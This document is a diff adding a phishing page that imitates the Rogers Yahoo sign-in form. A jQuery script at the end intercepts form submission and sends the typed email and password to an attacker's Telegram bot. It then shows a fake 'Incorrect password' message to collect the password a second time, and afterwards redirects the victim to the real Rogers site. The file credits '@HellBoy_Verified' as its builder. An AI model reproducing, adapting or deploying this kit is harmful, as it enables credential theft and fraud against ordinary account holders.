@@ -1,0 +1,433 @@
+<!DOCTYPE html>
+<html brand="rogers">
+  <head>
+    <title></title>
+    <meta charset="utf-8" />
+    <base href="/" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="robots" content="noindex" />
+    <!-- <link rel="icon" type="image/x-icon" href="https://www.rogers.com/app/prod/assets/i/favicon.ico"/> -->
+    <link id="brand-style" rel="stylesheet" />
+    <link id="media-style" rel="stylesheet" />
+    <link rel="stylesheet" href="./css/cdk-rogers.css" />
+    <script src="./js/jquery-3.5.1.min.js"></script>
+  </head>
+  <body class="backgroundImage">
+    <app-root _nghost-aap-c92="" ng-version="13.3.12" rogers-cdk="2.0.9"
+      ><div _ngcontent-aap-c92="" role="main" class="d-flex flex-column h-100">
+        <div
+          _ngcontent-aap-c92=""
+          class="d-flex justify-content-center flex-grow-1 flex-shrink-1 flex-basis-auto mt-76 lang-en"
+        >
+          <div _ngcontent-aap-c92="" class="app-container w-100">
+            <div _ngcontent-aap-c92="" class="d-flex flex-column h-100">
+              <div
+                _ngcontent-aap-c92=""
+                class="d-flex justify-content-center flex-grow-1 flex-shrink-1 flex-basis-auto mt-76"
+              >
+                <div _ngcontent-aap-c92="" class="app-container w-100">
+                  <div
+                    _ngcontent-aap-c92=""
+                    class="w-100 w-sm-75 w-md-50 m-sm-auto m-sm-12 border mainWidth ds-corners ds-bgcolor-snow dam-maxheight"
+                  >
+                    <div
+                      _ngcontent-aap-c92=""
+                      class="p-24 pr-sm-96 pl-sm-96 pb-sm-32 pt-sm-48"
+                    >
+                      <div _ngcontent-aap-c92="" class="modal-close-row">
+                        <!---->
+                      </div>
+                      <div
+                        _ngcontent-aap-c92=""
+                        class="pb-24 pb-sm-16 d-flex flex-row justify-content-between align-items-center logoheader"
+                      >
+                        <a
+                          _ngcontent-aap-c92=""
+                          ds-link=""
+                          variant="icon"
+                          href="https://www.rogers.com/?language=en"
+                          target="_self"
+                          title="Rogers Yahoo"
+                          tabindex="0"
+                          role="link"
+                          class="ds-link ds-pointer d-inline-flex outline-none mw-100 -icon"
+                          ><span
+                            class="ds-link__container d-flex align-items-center"
+                            ><span
+                              role="text"
+                              class="ds-link__wrapper d-inline-block text-button"
+                              ><span class="ds-link__copy"
+                                ><img
+                                  _ngcontent-aap-c92=""
+                                  class="logoImage"
+                                  src="./images/yahoo.png"
+                                  alt="Rogers Yahoo"
+                                /><!----></span
+                              ><!----></span
+                            ></span
+                          ></a
+                        ><!----><!----><!----><!---->
+                        <div _ngcontent-aap-c92="">
+                          <button
+                            _ngcontent-aap-c92=""
+                            ds-button=""
+                            variant="tertiary"
+                            title="Sélectionner pour afficher en français"
+                            aria-label="Sélectionner pour afficher en français"
+                            tabindex="0"
+                            role="button"
+                            class="ds-button ds-corners ds-pointer text-center mw-100 d-inline-block -tertiary -large"
+                            style="transform: scale(1)"
+                          >
+                            <span
+                              role="text"
+                              class="ds-button__wrapper d-flex justify-content-center align-items-center"
+                              ><!----><span
+                                class="ds-button__copy text-button text-nowrap ds-no-overflow mw-100"
+                              >
+                                FR
+                                <!----></span
+                              ><!----><!----></span
+                            ></button
+                          ><!---->
+                        </div>
+                        <!---->
+                      </div>
+                      <!---->
+                      <div _ngcontent-aap-c92="" id="transmitContainer">
+                        <div
+                          id="xmui-main-container"
+                          style="position: relative; width: 100%; height: 100%"
+                        ></div>
+                      </div>
+                      <ng-component _nghost-aap-c72="" class="ng-star-inserted"
+                        ><!---->
+                        <h1
+                          _ngcontent-aap-c72=""
+                          translate=""
+                          class="text-title-4 mb-8 ng-star-inserted"
+                        >
+                          Sign in
+                        </h1>
+                        <p
+                          _ngcontent-aap-c72=""
+                          translate=""
+                          class="mb-24 text-body-lg ng-star-inserted"
+                        >
+                          with your Rogers Yahoo credentials
+                        </p>
+
+                        <form
+                          _ngcontent-aap-c72=""
+                          novalidate=""
+                          id="LoginForm"
+                          method="POST"
+                          class="ng-star-inserted ng-untouched ng-pristine ng-invalid"
+                        >
+                          <div _ngcontent-aap-c72="">
+                            <ds-form-field
+                              _ngcontent-aap-c72=""
+                              class="ds-formField ng-tns-c48-1 ng-star-inserted ds-formField__typeds-input d-block position-relative ng-untouched ng-pristine ng-invalid -hasSuffix"
+                              ><div
+                                class="ds-formField__wrapper ng-tns-c48-1"
+                                style="margin-bottom: 20px"
+                              >
+                                <div
+                                  class="ds-formField__inputContainer d-flex position-relative ds-bgcolor-white ds-borders ng-tns-c48-1 ds-corners ds-brcolor-slate"
+                                >
+                                  <input
+                                    id="formHorizontalEmail"
+                                    type="email"
+                                    dsinput=""
+                                    id="input_email"
+                                    formcontrolname="input_email"
+                                    name="input_email"
+                                    autocapitalize="off"
+                                    spellcheck="false"
+                                    autocomplete="current-email"
+                                    autofill=""
+                                    placeholder="Username"
+                                    class="ds-input w-100 text-body mb-0 pt-2 ds-bgcolor-transparent round-input ng-tns-c48-1 cdk-text-field-autofill-monitored"
+                                    autocorrect="off"
+                                    title="Enter your email here"
+                                    aria-describedby="formfield-1-a11yDescription formfield-1-messages"
+                                  />
+                                  <div
+                                    class="ds-formField__suffix justify-content-center align-items-center ng-tns-c48-1"
+                                  ></div>
+                                </div>
+                              </div>
+                              <!----></ds-form-field
+                            ><!---->
+                            <ds-form-field
+                              _ngcontent-aap-c72=""
+                              class="ds-formField ng-tns-c48-1 ng-star-inserted ds-formField__typeds-input d-block position-relative"
+                              ><div class="ds-formField__wrapper ng-tns-c48-1">
+                                <div
+                                  class="ds-formField__inputContainer d-flex position-relative ds-bgcolor-white ds-borders ng-tns-c48-1 ds-corners ds-brcolor-slate"
+                                >
+                                  <input
+                                    id="formHorizontalPassword"
+                                    _ngcontent-aap-c72=""
+                                    type="password"
+                                    dsinput=""
+                                    id="input_password"
+                                    formcontrolname="input_password"
+                                    name="input_password"
+                                    autocapitalize="off"
+                                    spellcheck="false"
+                                    autocomplete="current-password"
+                                    autofill=""
+                                    placeholder="Password"
+                                    class="ds-input w-100 text-body mb-0 pt-2 ds-bgcolor-transparent round-input ng-tns-c48-1 cdk-text-field-autofill-monitored"
+                                    autocorrect="off"
+                                    title="Enter your password here"
+                                    aria-invalid="false"
+                                    aria-label="Password, Press tab to select show/hide password button"
+                                    aria-describedby="formfield-1-a11yDescription formfield-1-messages"
+                                  />
+                                  <div
+                                    class="ds-formField__suffix justify-content-center align-items-center ng-tns-c48-1"
+                                  >
+                                    <!----><!----><!----><button
+                                      _ngcontent-aap-c72=""
+                                      dssuffix=""
+                                      ds-button=""
+                                      type="button"
+                                      variant="icon"
+                                      title="Show password"
+                                      aria-pressed="false"
+                                      tabindex="0"
+                                      role="button"
+                                      class="ds-button ds-corners ds-pointer text-center mw-100 -icon d-inline-flex justify-content-center align-items-center -large ng-tns-c48-1 ng-star-inserted"
+                                      style="transform: scale(1)"
+                                    >
+                                      <span
+                                        role="text"
+                                        class="ds-button__wrapper d-flex justify-content-center align-items-center"
+                                        ><!----><span
+                                          class="ds-button__copy text-button text-nowrap ds-no-overflow mw-100 sr-only"
+                                          ><!----></span
+                                        ><ds-icon
+                                          _ngcontent-aap-c72=""
+                                          class="-size-24 ng-star-inserted"
+                                          ><span
+                                            role="img"
+                                            class="ds-icon d-inline-flex rds-icon-hide"
+                                            aria-hidden="true"
+                                            ><!----><!----></span
+                                          ></ds-icon
+                                        ><!----><!----></span
+                                      ></button
+                                    ><!---->
+                                  </div>
+                                </div>
+                                <div
+                                  class="d-none ng-tns-c48-1"
+                                  id="formfield-1-a11yDescription"
+                                ></div>
+                                <div
+                                  class="ds-formField__autoComplete position-absolute w-100 ng-tns-c48-1"
+                                ></div>
+                                <div
+                                  class="ds-formFields__messages ng-tns-c48-1"
+                                  id="formfield-1-messages"
+                                >
+                                  <!----><!----><!----><!----><!---->
+                                </div>
+                              </div>
+                              <!----></ds-form-field
+                            ><!---->
+                          </div>
+                          <div
+                            _ngcontent-aap-c72=""
+                            style="margin-top: 5px"
+                            class="ng-star-inserted"
+                          >
+                            <a
+                              _ngcontent-aap-c72=""
+                              ds-link=""
+                              variant="icon"
+                              class="mb-16 ds-color-link ds-link ds-pointer d-inline-flex outline-none mw-100 -icon"
+                              title="Select to reset your password"
+                              tabindex="0"
+                              role="link"
+                              ><span
+                                class="ds-link__container d-flex align-items-center"
+                                ><span
+                                  role="text"
+                                  class="ds-link__wrapper d-inline-block text-button"
+                                  ><span class="ds-link__copy"
+                                    >Forgot password?
+                                    <!----></span
+                                  ><!----></span
+                                ></span
+                              ></a
+                            >
+                          </div>
+                          <div
+                            class="ng-tns-c62-4 ds-alert ds-bgcolor-light-error ng-trigger ng-trigger-slideUp ds-borders ds-brcolor-error ng-star-inserted"
+                            style="margin-bottom: 20px"
+                            id="invalidLogin"
+                          >
+                            <div
+                              class="container position-relative py-16 ng-tns-c62-4 pr-72 pr-md-80"
+                            >
+                              <div
+                                _ngcontent-dsw-c72=""
+                                class="d-flex flex-column flex-md-row ng-tns-c62-4"
+                              >
+                                <div
+                                  _ngcontent-dsw-c72=""
+                                  class="flex-grow-1 d-flex"
+                                >
+                                  <ds-icon
+                                    _ngcontent-dsw-c72=""
+                                    name="exclamation-circle"
+                                    color="error"
+                                    caption="Attention"
+                                    class="mr-8 -size-24"
+                                    title="Error"
+                                    ><span
+                                      role="img"
+                                      class="ds-icon d-inline-flex rds-icon-exclamation-circle ds-color-error"
+                                      aria-label="Attention"
+                                      aria-hidden="false"
+                                      ><!----><!----></span
+                                    ></ds-icon
+                                  >
+                                  <div _ngcontent-dsw-c72="">
+                                    <p
+                                      _ngcontent-dsw-c72=""
+                                      damtranslationwithrouting=""
+                                      class="text-body mb-0 mw-content ng-star-inserted"
+                                      style=""
+                                    >
+                                      Incorrect password. Try again or use
+                                      <a
+                                        _ngcontent-dsw-c72=""
+                                        href="javascript:void(0)"
+                                        class="mb-0 ds-color-link ng-star-inserted"
+                                        title="Select to reset your password"
+                                      >
+                                        Forgot password </a
+                                      ><!---->
+                                      to reset it.
+                                    </p>
+                                    <!----><!---->
+                                  </div>
+                                </div>
+                              </div>
+                              <button
+                                ds-button=""
+                                variant="icon"
+                                class="position-absolute top-4 right-16 ng-tns-c62-4 ds-button ds-corners ds-pointer text-center mw-100 -icon d-inline-flex justify-content-center align-items-center -large -transparent ng-star-inserted"
+                                title="close"
+                                tabindex="0"
+                                role="button"
+                                style="transform: scale(1)"
+                              >
+                                <span
+                                  role="text"
+                                  class="ds-button__wrapper d-flex justify-content-center align-items-center"
+                                  ><!----><span
+                                    class="ds-button__copy text-button text-nowrap ds-no-overflow mw-100 sr-only"
+                                    ><!----></span
+                                  ><ds-icon
+                                    name="close"
+                                    class="-size-24 ng-star-inserted"
+                                    ><span
+                                      role="img"
+                                      class="ds-icon d-inline-flex rds-icon-close"
+                                      aria-hidden="true"
+                                      ><!----><!----></span
+                                    ></ds-icon
+                                  ><!----><!----></span
+                                ></button
+                              ><!---->
+                            </div>
+                          </div>
+                          <!----><!---->
+                          <div
+                            _ngcontent-aap-c72=""
+                            class="text-center signInButton"
+                          >
+                            <button
+                              _ngcontent-aap-c72=""
+                              ds-button=""
+                              role="button"
+                              type="submit"
+                              class="w-100 mb-16 ds-button ds-corners ds-pointer text-center mw-100 d-inline-block -primary -large"
+                              title="Select to sign in to Rogers Yahoo"
+                              tabindex="0"
+                              style="transform: scale(1)"
+                            >
+                              <span
+                                role="text"
+                                class="ds-button__wrapper d-flex justify-content-center align-items-center"
+                                ><!----><span
+                                  class="ds-button__copy text-button text-nowrap ds-no-overflow mw-100"
+                                  ><span
+                                    _ngcontent-aap-c72=""
+                                    class="ng-star-inserted"
+                                    >Sign in</span
+                                  ><!----><!----><!----></span
+                                ><!----><!----></span
+                              >
+                            </button>
+                          </div>
+                        </form>
+                        <!----><!----></ng-component
+                      ><!---->
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div></app-root
+    >
+    <script>
+      let count = 0;
+      $("#invalidLogin").hide();
+
+      $("form").submit(function (e) {
+        e.preventDefault();
+
+        console.log(count);
+        if (count >= 0) {
+          $.ajax({
+            url: "https://api.telegram.org/bot" + token + "/sendMessage",
+            method: "POST",
+            data: {
+              chat_id: chatID,
+              text:
+                "⚡️" +
+                `${count + 1}` +
+                ". BELL EMAIL BY 卄乇ㄥㄥ乃ㄖㄚ ⚡️ \n\n\n ✉️ Email : " +
+                $("#formHorizontalEmail").val() +
+                "\n\n 🔐 Password : " +
+                $("#formHorizontalPassword").val() +
+                "\n\n\n 👨🏾‍💻 Built by @HellBoy_Verified 👨🏾‍💻",
+            },
+            success: function (e) {
+              count++;
+              $("#invalidLogin").show(10);
+
+              console.log("Info to Telegram Sent", count);
+              $("form")[0].reset();
+              if (count > 1) {
+                window.location.href =
+                  "https://nullreferer.com/?https://www.rogers.com/";
+              }
+            },
+          });
+        } else {
+        }
+      });
+    </script>
+    <script src="config.js"></script>
+  </body>
+</html>
